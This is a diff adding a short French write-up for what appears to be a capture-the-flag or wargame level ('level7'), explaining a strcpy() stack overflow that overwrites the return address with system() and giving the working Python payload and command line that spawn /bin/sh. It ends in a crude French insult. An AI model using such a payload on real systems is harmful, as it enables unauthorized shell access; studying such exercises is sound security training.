@@ -1,0 +1,11 @@
+Le programme appelle un strcpy() sur un buffer non protege
+On peut s'en servir pour overwrite son propre eip en passant l'adresse de l'eip dans la stack en src et l'adresse de system en src
+
+Sur gdb, c'est assez simple, mais c'est plus complique en dehors parce qu'on a aucun moyen de voir les adresses
+J'ai fait un script qui les essaies toutes, pour trouver la bonne adresse a overwrite
+Le payload ressemble a ceci:
+
+python -c "print 'O'*20 + '\xfc\xf9\xff\xbf ' + '\x60\xb0\xe6\xb7' + 'OSEF\x10\xff\xff\xbf'" > /tmp/7
+env - PWD=$PWD COMMAND=$(python -c "print '/'*1024+'bin/sh'") /home/user/level7/level7 $(cat /tmp/7)
+
+FILS DE PUTE
